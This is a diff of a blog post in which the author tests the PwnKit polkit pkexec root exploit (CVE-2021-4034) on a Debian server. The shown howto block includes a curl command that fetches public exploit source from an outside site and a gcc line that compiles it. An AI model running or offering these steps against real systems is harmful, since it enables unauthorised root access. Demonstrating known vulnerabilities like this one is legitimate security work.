@@ -4,9 +4,12 @@ date: "2022-01-26T06:21:12-05:00"
 Tags: ["vuln", "cve"]
 Categories: ["security"] 
 ---
-The big news in Linux today is the [Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)](https://seclists.org/oss-sec/2022/q1/90), with [Arstechnica](https://arstechnica.com/information-technology/2022/01/a-bug-lurking-for-12-years-gives-attackers-root-on-every-major-linux-distro/) leading with, "_A bug lurking for 12 years gives attackers root on every major Linux distro - It's likely only a matter of time before PwnKit is exploited in the wild_" Needless to say, I immediately had to try it out on my own, I got on to a [Debian GNU/Linux](https://debian.org), and tried it out! Spoiler: it worked, here's how you can try it too.
+The big news in Linux today is the [Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)](https://seclists.org/oss-sec/2022/q1/90), with [Arstechnica](https://arstechnica.com/information-technology/2022/01/a-bug-lurking-for-12-years-gives-attackers-root-on-every-major-linux-distro/) leading with, "_A bug lurking for 12 years gives attackers root on every major Linux distro - It's likely only a matter of time before PwnKit is exploited in the wild_" Needless to say, I immediately had to try it out on my own, so I got on one of my [Debian GNU/Linux](https://debian.org) servers to test it. Spoiler: it worked, here's how you can try it too.
 
-```# id
+## Howto
+
+```
+# id
 uid=1000(fak3r) gid=1000(fak3r) groups=1000(fak3r),27(sudo)
 $ curl -O https://haxx.in/files/blasty-vs-pkexec.c
 $ gcc blasty-vs-pkexec.c
